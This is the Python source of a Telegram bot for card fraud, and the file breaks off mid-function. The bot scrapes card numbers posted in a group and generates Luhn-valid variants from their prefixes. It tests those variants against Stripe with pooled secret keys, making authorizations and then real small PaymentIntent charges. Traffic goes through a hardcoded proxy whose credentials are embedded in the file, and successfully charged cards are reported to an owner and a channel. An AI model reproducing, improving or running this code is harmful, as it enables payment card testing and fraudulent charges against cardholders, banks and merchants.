#!/usr/bin/env python3
"""
High-Performance Telegram Card Monitor & Checker Bot
Monitors a group for card posts, generates variations, checks them, and reports to owner.
"""

import re
import asyncio
import logging
import os
from pathlib import Path
from typing import List, Tuple, Optional, Dict, Set
from datetime import datetime
import random
import json
from collections import deque

from pyrogram import Client, filters
from pyrogram.types import Message
import aiohttp
from aiohttp import BasicAuth

# Load environment variables
try:
    from dotenv import load_dotenv
    load_dotenv('config.env')
except ImportError:
    pass

# ==================== CONFIGURATION ====================
MONITORED_GROUP_ID = int(os.getenv('MONITORED_GROUP_ID', '-1002587158726'))
OWNER_USER_ID = int(os.getenv('OWNER_USER_ID', '5211166230'))
CARDS_PER_BIN = int(os.getenv('CARDS_PER_BIN', '80'))
MAX_CONCURRENT_CHECKS = int(os.getenv('MAX_CONCURRENT_CHECKS', '20'))

# Telegram credentials
API_ID = os.getenv('API_ID', 'YOUR_API_ID')
API_HASH = os.getenv('API_HASH', 'YOUR_API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')

SUCCESS_CHANNEL_ID = int(os.getenv('SUCCESS_CHANNEL_ID', '-1003369945982'))
BIN_LOOKUP_TIMEOUT = int(os.getenv('BIN_LOOKUP_TIMEOUT', '10'))
TESTED_BINS_PATH = Path(os.getenv('TESTED_BINS_FILE', 'testedbins.txt'))

# Regex to match card format: 16 digits | 1-2 digits | 2-4 digits | optional CVV
CARD_PATTERN = re.compile(r'(\d{16})\|(\d{1,2})\|(\d{2,4})(?:\|(\d{3,4}))?')

# ==================== LOGGING SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== GLOBAL STATE ====================
card_queue = deque()  # Queue for cards to process
processing_cards: Set[str] = set()  # Currently processing cards
stats = {
    'total_checked': 0,
    'total_succeeded': 0,
    'total_pmi_attempts': 0,
    'total_pmi_succeeded': 0,
    'bins_processed': {},
    'started_at': datetime.now()
}

BIN_LOOKUP_HEADERS = {
    'authority': 'lookup.binlist.net',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'origin': 'https://binlist.net',
    'referer': 'https://binlist.net/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

bin_lookup_session: Optional[aiohttp.ClientSession] = None
bin_info_cache: Dict[str, Dict] = {}
tested_bins: Set[str] = set()

def _normalize_bin_prefix(bin_prefix: str) -> str:
    return (bin_prefix or "")[:12]

def load_tested_bins() -> None:
    """Load tested 12-digit BIN prefixes from file."""
    global tested_bins
    if TESTED_BINS_PATH.exists():
        try:
            with TESTED_BINS_PATH.open('r', encoding='utf-8') as f:
                tested_bins = {line.strip() for line in f if line.strip()}
        except Exception as exc:
            logger.error(f"Failed to load tested bins: {exc}")
            tested_bins = set()
    else:
        tested_bins = set()

def is_bin_tested(bin_prefix: str) -> bool:
    """Check if a 12-digit BIN has already been processed."""
    return _normalize_bin_prefix(bin_prefix) in tested_bins

def mark_bin_tested(bin_prefix: str) -> None:
    """Persistently mark a 12-digit BIN as processed."""
    normalized = _normalize_bin_prefix(bin_prefix)
    if not normalized or normalized in tested_bins:
        return
    tested_bins.add(normalized)
    try:
        TESTED_BINS_PATH.parent.mkdir(parents=True, exist_ok=True)
        with TESTED_BINS_PATH.open('a', encoding='utf-8') as f:
            f.write(normalized + '\n')
    except Exception as exc:
        logger.error(f"Failed to persist tested bin {normalized}: {exc}")

async def get_bin_lookup_session() -> aiohttp.ClientSession:
    """Ensure a shared session for BIN lookups."""
    global bin_lookup_session
    if bin_lookup_session is None or bin_lookup_session.closed:
        timeout = aiohttp.ClientTimeout(total=BIN_LOOKUP_TIMEOUT)
        bin_lookup_session = aiohttp.ClientSession(timeout=timeout)
    return bin_lookup_session

async def fetch_bin_details(bin_prefix: str) -> Optional[Dict]:
    """Fetch metadata for the first 6 digits of the BIN."""
    bin6 = (bin_prefix or "")[:6]
    if len(bin6) < 6:
        return None
    if bin6 in bin_info_cache:
        return bin_info_cache[bin6]
    
    session = await get_bin_lookup_session()
    url = f"https://lookup.binlist.net/{bin6}"
    try:
        async with session.get(url, headers=BIN_LOOKUP_HEADERS) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                bin_info_cache[bin6] = data
                logger.info(f"Fetched BIN info for {bin6}: {data.get('scheme')} {data.get('type')}")
                return data
            text = await resp.text()
            logger.warning(f"BIN lookup failed for {bin6}: HTTP {resp.status} {text}")
    except Exception as exc:
        logger.error(f"Error fetching BIN info for {bin6}: {exc}")
    return None

async def close_bin_lookup_session() -> None:
    """Close the BIN lookup session if it exists."""
    global bin_lookup_session
    if bin_lookup_session and not bin_lookup_session.closed:
        await bin_lookup_session.close()
        bin_lookup_session = None

# ==================== LUHN ALGORITHM ====================
def luhn_checksum(card_number: str) -> int:
    """Calculate Luhn checksum for a card number."""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number: str) -> bool:
    """Check if a card number is valid according to Luhn algorithm."""
    return luhn_checksum(card_number) == 0

def calculate_luhn_digit(partial_card: str) -> str:
    """Calculate the check digit for a partial card number."""
    check_digit = luhn_checksum(partial_card + '0')
    return str((10 - check_digit) % 10)

def generate_cards_from_bin(bin_prefix: str, exp_month: str, exp_year: str, count: int = 80) -> List[str]:
    """
    Generate valid card numbers from a BIN (first 6-12 digits).
    Returns list of cards in format: NUMBER|MM|YY
    """
    generated_cards = []
    seen = set()
    
    # Extract BIN (we'll use first 12 digits as base)
    bin_len = len(bin_prefix)
    if bin_len < 6:
        return []
    
    # For 16-digit cards, we need to generate the remaining digits
    attempts = 0
    max_attempts = count * 10  # Prevent infinite loops
    
    while len(generated_cards) < count and attempts < max_attempts:
        attempts += 1
        
        # Generate random digits for positions after BIN up to 15th position
        if bin_len >= 15:
            # Already have 15 digits, just calculate check digit
            partial = bin_prefix[:15]
        else:
            # Generate random digits to fill up to 15 digits
            random_part = ''.join([str(random.randint(0, 9)) for _ in range(15 - bin_len)])
            partial = bin_prefix + random_part
        
        # Calculate the check digit (16th digit)
        check_digit = calculate_luhn_digit(partial)
        full_card = partial + check_digit
        
        # Verify it's valid and not duplicate
        if full_card not in seen and is_luhn_valid(full_card):
            seen.add(full_card)
            card_str = f"{full_card}|{exp_month}|{exp_year}"
            generated_cards.append(card_str)
    
    return generated_cards

# ==================== STRIPE CHECKER ====================
class StripeChecker:
    """Handles Stripe API card validation."""
    
    INVALID_KEY_ERRORS = {'api_key_expired', 'testmode_charges_only'}
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.keys = []  # Will be loaded from keys.json
        self.timeout = aiohttp.ClientTimeout(total=30)
        self.proxy_url = (
            "http://abc9340056_bbii-zone-star-region-US:22708872@"
            "na.d9948b8569c695d3.abcproxy.vip:4950"
        )
        self.use_proxy = True
    
    @staticmethod
    def extract_decline_code_and_advice(body_text: str) -> Tuple[str, str]:
        """Extract decline and advice codes from a Stripe error payload."""
        try:
            body = json.loads(body_text)
        except Exception:
            return ("Unknown error", "No advice")
        
        err = body.get("error") if isinstance(body, dict) else None
        if isinstance(err, dict):
            decline_code = (
                err.get("decline_code")
                or err.get("code")
                or err.get("error")
                or err.get("message")
                or "Unknown error"
            )
            advise_code = (
                err.get("failure_code")
                or err.get("advice")
                or err.get("message")
                or "No advice"
            )
        else:
            decline_code = "Unknown error"
            advise_code = "No advice"
        
        return (decline_code, advise_code)
    
    def _remove_key_pair(self, secret_key: str) -> None:
        """Remove a key pair from the loaded keys when it is invalid."""
        if not secret_key:
            return
        before = len(self.keys)
        self.keys = [
            pair for pair in self.keys
            if (pair.get('sk') or pair.get('secret_key')) != secret_key
        ]
        if before != len(self.keys):
            logger.warning(f"Removed invalid Stripe key: {secret_key[:10]}***")
    
    @staticmethod
    def format_failure_message(decline: str, advise: Optional[str]) -> str:
        if advise and advise != "No advice":
            return f"{decline} | {advise}"
        return decline
    
    def _get_proxy(self) -> Optional[str]:
        return self.proxy_url if self.use_proxy else None
    
    def set_proxy_enabled(self, enabled: bool) -> None:
        self.use_proxy = enabled
        state = "enabled" if enabled else "disabled"
        logger.info(f"Stripe proxy {state}")
    
    async def create_payment_intent(self, sk: str) -> Dict:
        """Create a Stripe PaymentIntent for PMI flow."""
        url = "https://api.stripe.com/v1/payment_intents"
        payload = {
            "amount": 150,
            "currency": "usd",
            "payment_method_types[]": "card"
        }
        session = await self.ensure_session()
        try:
            async with session.post(url, data=payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    return await resp.json()
                text = await resp.text()
                decline, advise = self.extract_decline_code_and_advice(text)
                retry_key = decline in self.INVALID_KEY_ERRORS or resp.status in (401, 403)
                return {
                    'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
                    'advise': advise,
                    'details': text,
                    'retry_key': retry_key
                }
        except Exception as e:
            return {'error': str(e)}
    
    async def confirm_payment_intent(self, pk: str, pi: Dict, card_data: str) -> Dict:
        """Confirm a PaymentIntent with card data."""
        pi_id = pi.get("id")
        client_secret = pi.get("client_secret", "")
        if not pi_id or not client_secret:
            return {'error': 'Invalid PaymentIntent', 'details': str(pi)}
        
        parts = card_data.split("|")
        if len(parts) < 3:
            return {'error': 'Invalid card format'}
        number, exp_month, exp_year = parts[:3]
        
        url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        payload = {
            "source_data[type]": "card",
            "source_data[card][number]": number,
            "source_data[card][exp_month]": exp_month,
            "source_data[card][exp_year]": exp_year,
            "source_data[card][tokenization_method]": "google",
            "source_data[payment_user_agent]": "stripe-android/20.48.0;PaymentSheet",
            "client_secret": client_secret,
            "key": pk,
        }
        
        session = await self.ensure_session()
        try:
            async with session.post(url, data=payload, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    return await resp.json()
                text = await resp.text()
                decline, advise = self.extract_decline_code_and_advice(text)
                retry_key = decline in self.INVALID_KEY_ERRORS or resp.status in (401, 403)
                return {
                    'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
                    'advise': advise,
                    'details': text,
                    'retry_key': retry_key
                }
        except Exception as e:
            return {'error': str(e)}
    
    async def run_payment_intent(self, card_data: str) -> Tuple[bool, str]:
        """Run PMI flow for a single card."""
        if not self.keys:
            logger.error(f"Stripe PMI failed for {card_data}: No Stripe keys available")
            return False, "No Stripe keys available"
        
        local_keys = list(self.keys)
        tried: Set[str] = set()
        
        while True:
            candidates = [
                pair for pair in local_keys
                if (pair.get('sk') or pair.get('secret_key')) not in tried
            ]
            if not candidates:
                if self.keys:
                    logger.error(f"Stripe PMI failed for {card_data}: No valid Stripe keys remaining")
                    return False, "No valid Stripe keys remaining"
                logger.error(f"Stripe PMI failed for {card_data}: No Stripe keys available")
                return False, "No Stripe keys available"
            
            key_pair = random.choice(candidates)
            sk = key_pair.get('sk') or key_pair.get('secret_key')
            pk = key_pair.get('pk') or key_pair.get('publishable_key')
            
            if not sk or not pk:
                tried.add(sk or "")
                continue
            
            tried.add(sk)
            
            pi_result = await self.create_payment_intent(sk)
            if not pi_result or 'id' not in pi_result:
                decline = pi_result.get('error', 'PI creation failed') if isinstance(pi_result, dict) else 'PI creation failed'
                advise = pi_result.get('advise') if isinstance(pi_result, dict) else None
                if isinstance(pi_result, dict) and pi_result.get('retry_key'):
                    self._remove_key_pair(sk)
                    local_keys = list(self.keys)
                    tried.discard(sk)
                    continue
                message = self.format_failure_message(decline, advise)
                logger.warning(f"Stripe PMI decline during PI creation for {card_data}: {message}")
                return False, message
            
            confirm_result = await self.confirm_payment_intent(pk, pi_result, card_data)
            if isinstance(confirm_result, dict) and confirm_result.get('status') == 'succeeded':
                logger.info(f"Stripe PMI charge succeeded for {card_data}")
                return True, "Charged"
            
            decline = confirm_result.get('error') if isinstance(confirm_result, dict) else 'PI confirmation failed'
            advise = confirm_result.get('advise') if isinstance(confirm_result, dict) else None
            retry_key = isinstance(confirm_result, dict) and confirm_result.get('retry_key')
            
            if retry_key:
                self._remove_key_pair(sk)
                local_keys = list(self.keys)
                tried.discard(sk)
                continue
            
            if isinstance(confirm_result, dict) and confirm_result.get('status'):
                decline = confirm_result.get('status')
            
            message = self.format_failure_message(decline or 'PI confirmation failed', advise)
            logger.warning(f"Stripe PMI decline during confirmation for {card_data}: {message}")
            return False, message
    
    async def ensure_session(self):
        """Ensure aiohttp session is initialized."""
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(timeout=self.timeout)
        return self.session
    
    async def close(self):
        """Close the aiohttp session."""
        if self.session and not self.session.closed:
            await self.session.close()
    
    def load_keys(self):
        """Load Stripe keys from keys.json or return test keys."""
        self.keys = []
        try:
            if os.path.exists('keys.json'):
                with open('keys.json', 'r') as f:
                    data = json.load(f)
                    # Extract all keys from all groups
                    for group_keys in data.values():
                        if isinstance(group_keys, list):
                            self.keys.extend(group_keys)
        except Exception as e:
            logger.error(f"Failed to load keys: {e}")
        
        if not self.keys:
            logger.warning("No Stripe keys loaded. Card checking will fail.")
    
    def get_random_key_pair(self) -> Optional[Dict[str, str]]:
        """Get a random Stripe key pair."""
        if not self.keys:
            return None
        return random.choice(self.keys)
    
    async def create_source(self, pk: str, card_data: str) -> Dict:
        """Create a Stripe source with the given card."""
        parts = card_data.split('|')
        if len(parts) < 3:
            return {'error': 'Invalid card format'}
        
        number, exp_month, exp_year = parts[:3]
        
        url = "https://api.stripe.com/v1/sources"
        payload = {
            "type": "card",
            "card[number]": number,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year,
            "key": pk,
            "payment_user_agent": "stripe.js/v3",
        }
        
        session = await self.ensure_session()
        try:
            async with session.post(url, data=payload, proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    text = await resp.text()
                    decline, advise = self.extract_decline_code_and_advice(text)
                    retry_key = decline in self.INVALID_KEY_ERRORS or resp.status == 401
                    return {
                        'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
                        'advise': advise,
                        'details': text,
                        'retry_key': retry_key
                    }
        except Exception as e:
            return {'error': str(e)}
    
    async def create_customer(self, sk: str, source_id: str) -> Dict:
        """Create a Stripe customer with the source."""
        url = "https://api.stripe.com/v1/customers"
        payload = {"source": source_id}
        
        session = await self.ensure_session()
        try:
            async with session.post(url, data=payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    text = await resp.text()
                    decline, advise = self.extract_decline_code_and_advice(text)
                    retry_key = decline in self.INVALID_KEY_ERRORS or resp.status in (401, 403)
                    return {
                        'error': decline if decline != "Unknown error" else f'HTTP {resp.status}',
                        'advise': advise,
                        'details': text,
                        'retry_key': retry_key
                    }
        except Exception as e:
            return {'error': str(e)}

    async def create_and_confirm_setup_intent(self, sk: str, customer_id: str, source_id: str) -> Dict:
        """Create and confirm a SetupIntent using the provided customer and source."""
        session = await self.ensure_session()
        
        create_url = "https://api.stripe.com/v1/setup_intents"
        create_payload = {
            "customer": customer_id,
            "payment_method_types[]": "card"
        }
        
        try:
            async with session.post(create_url, data=create_payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as create_resp:
                create_text = await create_resp.text()
                if create_resp.status != 200:
                    decline, advise = self.extract_decline_code_and_advice(create_text)
                    retry_key = decline in self.INVALID_KEY_ERRORS or create_resp.status in (401, 403)
                    return {
                        'error': decline if decline != "Unknown error" else f'HTTP {create_resp.status}',
                        'advise': advise,
                        'details': create_text,
                        'retry_key': retry_key
                    }
                setup_intent = await create_resp.json()
                setup_intent_id = setup_intent.get('id')
                if not setup_intent_id:
                    return {'error': 'No setup intent ID returned', 'details': create_text}
        except Exception as e:
            return {'error': str(e)}
        
        confirm_url = f"https://api.stripe.com/v1/setup_intents/{setup_intent_id}/confirm"
        confirm_payload = {
            "payment_method": source_id
        }
        
        try:
            async with session.post(confirm_url, data=confirm_payload, auth=BasicAuth(sk, ""), proxy=self._get_proxy()) as confirm_resp:
                if confirm_resp.status == 200:
                    return await confirm_resp.json()
                confirm_text = await confirm_resp.text()
                decline, advise = self.extract_decline_code_and_advice(confirm_text)
                retry_key = decline in self.INVALID_KEY_ERRORS or confirm_resp.status in (401, 403)
                return {
                    'error': decline if decline != "Unknown error" else f'HTTP {confirm_resp.status}',
                    'advise': advise,
                    'details': confirm_text,
                    'retry_key': retry_key
                }
        except Exception as e:
            return {'error': str(e)}
    
    async def check_card(self, card_data: str) -> Tuple[bool, str]:
        """
        Check if a card is valid using Stripe.
        Returns: (success: bool, message: str)
        """
        if not self.keys:
            logger.error(f"Stripe check failed for {card_data}: No Stripe keys available")
            return False, "No Stripe keys available"
        
        local_keys = list(self.keys)
        tried: Set[str] = set()
        
        while True:
            candidates = [
                pair for pair in local_keys
                if (pair.get('sk') or pair.get('secret_key')) not in tried
            ]
            if not candidates:
                if self.keys:
                    logger.error(f"Stripe check failed for {card_data}: No valid Stripe keys remaining")
                    return False, "No valid Stripe keys remaining"
                logger.error(f"Stripe check failed for {card_data}: No Stripe keys available")
                return False, "No Stripe keys available"
            
            key_pair = random.choice(candidates)
            sk = key_pair.get('sk') or key_pair.get('secret_key')
            pk = key_pair.get('pk') or key_pair.get('publishable_key')
            
            if not sk or not pk:
                tried.add(sk or "")
                continue
            
            tried.add(sk)
            
            # Create source
            src_result = await self.create_source(pk, card_data)
            if not src_result or 'id' not in src_result:
                decline = src_result.get('error', 'Source creation failed') if isinstance(src_result, dict) else 'Source creation failed'
                advise = src_result.get('advise') if isinstance(src_result, dict) else None
                if isinstance(src_result, dict) and src_result.get('retry_key'):
                    self._remove_key_pair(sk)
                    local_keys = list(self.keys)
                    tried.discard(sk)
                    continue
                message = self.format_failure_message(decline, advise)
                logger.warning(f"Stripe decline during source creation for {card_data}: {message}")
                return False, message
            
            source_id = src_result['id']
            
            # Create customer
            cust_result = await self.create_customer(sk, source_id)
            if not cust_result or 'id' not in cust_result:
                decline = cust_result.get('error', 'Customer creation failed') if isinstance(cust_result, dict) else 'Customer creation failed'
                advise = cust_result.get('advise') if isinstance(cust_result, dict) else None
                if isinstance(cust_result, dict) and cust_result.get('retry_key'):
                    self._remove_key_pair(sk)
                    local_keys = list(self.keys)
                    tried.discard(sk)
                    continue
                message = self.format_failure_message(decline, advise)
                logger.warning(f"Stripe decline during customer creation for {card_data}: {message}")
                return False, message
            
            customer_id = cust_result['id']
            
            # Create and confirm setup intent
            setup_intent_result = await self.create_and_confirm_setup_intent(sk, customer_id, source_id)
            if isinstance(setup_intent_result, dict) and setup_intent_result.get('status') == 'succeeded':
                logger.info(f"Stripe authorization succeeded for {card_data}")
                return True, "Card authorized successfully"
            
            decline = setup_intent_result.get('error') if isinstance(setup_intent_result, dict) else 'Setup intent confirmation failed'
            advise = setup_intent_result.get('advise') if isinstance(setup_intent_result, dict) else None
            retry_key = isinstance(setup_intent_result, dict) and setup_intent_result.get('retry_key')
            
            if retry_key:
                self._remove_key_pair(sk)
                local_keys = list(self.keys)
                tried.discard(sk)
                continue
            
            if isinstance(setup_intent_result, dict) and setup_intent_result.get('status'):
                decline = setup_intent_result.get('status')
            
            message = self.format_failure_message(decline or 'Setup intent confirmation failed', advise)
            logger.warning(f"Stripe decline during setup intent for {card_data}: {message}")
            return False, message

# ==================== BOT LOGIC ====================
load_tested_bins()
stripe_checker = StripeChecker()

async def process_card_message(message: Message, app: Client):
    """Extract cards from a message and queue them for processing."""
    if not message.text:
        return
    
    # Find all cards in the message
    matches = CARD_PATTERN.findall(message.text)
    if not matches:
        return
    
    logger.info(f"Found {len(matches)} card(s) in message {message.id}")
    
    for match in matches:
        card_num, exp_month, exp_year, cvv = match
        
        # Extract BIN (first 12 digits for generation)
        bin_prefix = card_num[:12]
        if len(bin_prefix) < 12:
            logger.warning(f"Skipping card with insufficient BIN length from message {message.id}")
            continue
        if is_bin_tested(bin_prefix):
            logger.info(f"BIN {bin_prefix} already tested. Skipping message {message.id}")
            continue
        
        # Create card info
        card_info = {
            'original_card': f"{card_num}|{exp_month}|{exp_year}",
            'bin': bin_prefix,
            'exp_month': exp_month,
            'exp_year': exp_year,
            'message_id': message.id,
            'message_link': message.link if hasattr(message, 'link') else None
        }
        
        # Add to queue
        card_queue.append(card_info)
        logger.info(f"Queued BIN {bin_prefix} from message {message.id}")

async def process_queue(app: Client):
    """Continuously process cards from the queue."""
    logger.info("Card processing queue started")
    
    while True:
        try:
            if not card_queue:
                await asyncio.sleep(1)
                continue
            
            # Get next card from queue
            card_info = card_queue.popleft()
            bin_prefix = card_info['bin']
            if is_bin_tested(bin_prefix):
                logger.info(f"BIN {bin_prefix} already tested (queue). Skipping.")
                continue
            bin_details = await fetch_bin_details(bin_prefix)
            card_info['bin_details'] = bin_details
            
            # Skip if already processing this BIN
            if bin_prefix in processing_cards:
                logger.info(f"BIN {bin_prefix} already processing, skipping")
                continue
            
            processing_cards.add(bin_prefix)
            logger.info(f"Processing BIN: {bin_prefix}")
            
            # Generate cards
            generated_cards = generate_cards_from_bin(
                bin_prefix,
                card_info['exp_month'],
                card_info['exp_year'],
                CARDS_PER_BIN
            )
            
            logger.info(f"Generated {len(generated_cards)} cards for BIN {bin_prefix}")
            
            if not generated_cards:
                processing_cards.remove(bin_prefix)
                continue
            
            # Check cards concurrently
            succeeded_cards = []
            failed_count = 0
            
            sem = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)
            
            async def check_single_card(card: str):
                nonlocal failed_count
                async with sem:
                    try:
                        success, message = await stripe_checker.check_card(card)
                        if success:
                            return card, True, message
                        else:
                            failed_count += 1
                            return card, False, message
                    except Exception as e:
                        logger.error(f"Error checking card: {e}")
                        failed_count += 1
                        return card, False, str(e)
            
            # Check all cards
            tasks = [check_single_card(card) for card in generated_cards]
            results = await asyncio.gather(*tasks)
            
            # Collect successful cards
            for card, success, message in results:
                if success:
                    succeeded_cards.append(card)
            
            # Update stats
            stats['total_checked'] += len(generated_cards)
            stats['total_succeeded'] += len(succeeded_cards)
            
            if bin_prefix not in stats['bins_processed']:
                stats['bins_processed'][bin_prefix] = {
                    'checked': 0,
                    'succeeded': 0,
                    'pmi_attempts': 0,
                    'pmi_succeeded': 0,
                    'bin_details': bin_details
                }
            else:
                stats['bins_processed'][bin_prefix]['bin_details'] = bin_details or stats['bins_processed'][bin_prefix].get('bin_details')

            stats['bins_processed'][bin_prefix]['checked'] += len(generated_cards)
            stats['bins_processed'][bin_prefix]['succeeded'] += len(succeeded_cards)

            # Run PMI flow if we had any authorizations succeed
            pmi_results: List[Tuple[str, bool, str]] = []
            if succeeded_cards:
                pmi_cards = generate_cards_from_bin(
                    bin_prefix,
                    card_info['exp_month'],
                    card_info['exp_year'],
                    50
                )

                if pmi_cards:
                    logger.info(f"Running PMI flow for {len(pmi_cards)} cards on BIN {bin_prefix}")
                    stats['total_pmi_attempts'] += len(pmi_cards)
                    stats['bins_processed'][bin_prefix]['pmi_attempts'] += len(pmi_cards)

                    sem_pmi = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)

                    async def run_pmi_card(card: str):
                        async with sem_pmi:
                            try:
                                success, message = await stripe_checker.run_payment_intent(card)
                                return card, success, message
                            except Exception as e:
                                logger.error(f"Error running PMI for {card}: {e}")
                                return card, False, str(e)

                    pmi_tasks = [run_pmi_card(card) for card in pmi_cards]
                    pmi_results = await asyncio.gather(*pmi_tasks)

                    pmi_success_count = sum(1 for _, success, _ in pmi_results if success)
                    stats['total_pmi_succeeded'] += pmi_success_count
                    stats['bins_processed'][bin_prefix]['pmi_succeeded'] += pmi_success_count

                    if pmi_success_count > 0:
                        auth_success_rate = (len(succeeded_cards) / len(generated_cards) * 100) if generated_cards else 0
                        pmi_success_rate = (pmi_success_count / len(pmi_cards) * 100) if pmi_cards else 0
                        bin6 = bin_prefix[:6]
                        scheme_upper = (bin_details or {}).get('scheme', 'UNKNOWN')
                        scheme_upper = scheme_upper.upper() if isinstance(scheme_upper, str) else str(scheme_upper)
                        card_type_upper = (bin_details or {}).get('type', 'UNKNOWN')
                        card_type_upper = card_type_upper.upper() if isinstance(card_type_upper, str) else str(card_type_upper)
                        brand_name_raw = (bin_details or {}).get('brand')
                        if isinstance(brand_name_raw, str):
                            brand_name = brand_name_raw
                        elif brand_name_raw is None:
                            brand_name = "Unknown"
                        else:
                            brand_name = str(brand_name_raw)

                        bank_name_raw = ((bin_details or {}).get('bank') or {}).get('name')
                        if isinstance(bank_name_raw, str):
                            bank_name = bank_name_raw
                        elif bank_name_raw is None:
                            bank_name = "Unknown"
                        else:
                            bank_name = str(bank_name_raw)
                        country_info = (bin_details or {}).get('country') or {}
                        country_name_raw = country_info.get('name')
                        if isinstance(country_name_raw, str):
                            country_name = country_name_raw
                        elif country_name_raw is None:
                            country_name = "Unknown"
                        else:
                            country_name = str(country_name_raw)
                        country_emoji_raw = country_info.get('emoji')
                        country_emoji = country_emoji_raw if isinstance(country_emoji_raw, str) else ""

                        for card_value, success, _ in pmi_results:
                            if not success:
                                continue
                            if card_value.count('|') == 2:
                                display_card = f"{card_value}|xxx"
                            else:
                                display_card = card_value
                            summary_text = (
                                f"{display_card} - #{bin6} - {scheme_upper} - {card_type_upper} - "
                                f"{brand_name} - {bank_name} - {country_name} {country_emoji} - "
                                f"PMI ✅ {pmi_success_rate:.1f}% - CHECK ✅ {auth_success_rate:.1f}%"
                            )
                            try:
                                await app.send_message(
                                    SUCCESS_CHANNEL_ID,
                                    summary_text,
                                    disable_web_page_preview=True
                                )
                            except Exception as send_exc:
                                logger.error(f"Failed to send success summary to channel: {send_exc}")
            
            # Send report to owner
            await send_report(
                app,
                card_info,
                generated_cards,
                succeeded_cards,
                failed_count,
                pmi_results
            )
            
            # Mark this BIN as tested to avoid duplicate processing
            mark_bin_tested(bin_prefix)
            
            # Remove from processing
            processing_cards.remove(bin_prefix)
            
            logger.info(f"Completed processing BIN {bin_prefix}: {len(succeeded_cards)}/{len(generated_cards)} succeeded")
            
        except Exception as e:
            logger.error(f"Error in queue processing: {e}", exc_info=True)
            await asyncio.sleep(1)

async def send_report(app: Client, card_info: Dict, generated: List[str], succeeded: List[str], failed: int, pmi_results: List[Tuple[str, bool, str]]):
    """Send a beautiful report to the owner."""
    bin_prefix = card_info['bin']
    success_rate = (len(succeeded) / len(generated) * 100) if generated else 0
    pmi_attempts = len(pmi_results)
    pmi_successes = sum(1 for _, success, _ in pmi_results if success)
    pmi_failures = pmi_attempts - pmi_successes
    pmi_success_rate = (pmi_successes / pmi_attempts * 100) if pmi_attempts else 0
    bin_details = card_info.get('bin_details') or stats['bins_processed'].get(bin_prefix, {}).get('bin_details')
    
    scheme = (bin_details or {}).get('scheme') or "Unknown"
    card_type = (bin_details or {}).get('type') or "Unknown"
    brand = (bin_details or {}).get('brand') or "Unknown"
    bank_info = (bin_details or {}).get('bank') or {}
    country_info = (bin_details or {}).get('country') or {}
    
    bank_name = bank_info.get('name') or "Unknown"
    country_name = country_info.get('name') or "Unknown"
    country_emoji = country_info.get('emoji') or ""
    
    # Create report message
    report = f"""
╔═══════════════════════════════╗
║    🎯 CARD CHECKER REPORT    ║
╚═══════════════════════════════╝

📊 **BIN Information**
├ BIN: `{bin_prefix}`
├ Original Card: `{card_info['original_card']}`
└ Message ID: `{card_info['message_id']}`

🏦 **BIN Details**
├ Scheme: `{scheme.upper()}`
├ Type: `{card_type.upper()}`
├ Brand: `{brand}`
├ Bank: `{bank_name}`
└ Country: `{country_name} {country_emoji}`

📈 **Check Results**
├ Total Generated: `{len(generated)}`
├ ✅ Succeeded (Auth): `{len(succeeded)}`
├ ❌ Failed (Auth): `{failed}`
└ 📊 Success Rate (Auth): `{success_rate:.1f}%`

💳 **PaymentIntent Charges**
├ Total Attempts: `{pmi_attempts}`
├ ✅ Charged: `{pmi_successes}`
├ ❌ Declined: `{pmi_failures}`
└ 📊 Charge Rate: `{pmi_success_rate:.1f}%`

⏱ **Session Stats**
├ Total Checked: `{stats['total_checked']}`
├ Total Succeeded: `{stats['total_succeeded']}`
├ Overall Rate: `{(stats['total_succeeded']/stats['total_checked']*100) if stats['total_checked'] else 0:.1f}%`
├ Total PMI Attempts: `{stats['total_pmi_attempts']}`
├ Total PMI Charged: `{stats['total_pmi_succeeded']}`
└ Overall PMI Rate: `{(stats['total_pmi_succeeded']/stats['total_pmi_attempts']*100) if stats['total_pmi_attempts'] else 0:.1f}%`
"""

    if succeeded:
        report += f"\n\n✅ **SUCCESSFUL CARDS** ({len(succeeded)}):\n"
        report += "```\n"
        # Show first 10 successful cards
        for card in succeeded[:10]:
            report += f"{card}\n"
        if len(succeeded) > 10:
            report += f"... and {len(succeeded) - 10} more\n"
        report += "```"
    
    if pmi_results:
        report += f"\n\n💳 **PMI RESULTS** ({pmi_attempts}):\n"
        report += "```\n"
        for card, success, message in pmi_results[:10]:
            status = "✅" if success else "❌"
            report += f"{status} {card} → {message}\n"
        if len(pmi_results) > 10:
            report += f"... and {len(pmi_results) - 10} more\n"
        report += "```"
    
    # Add timestamp
    report += f"\n\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    try:
        await app.send_message(OWNER_USER_ID, report)
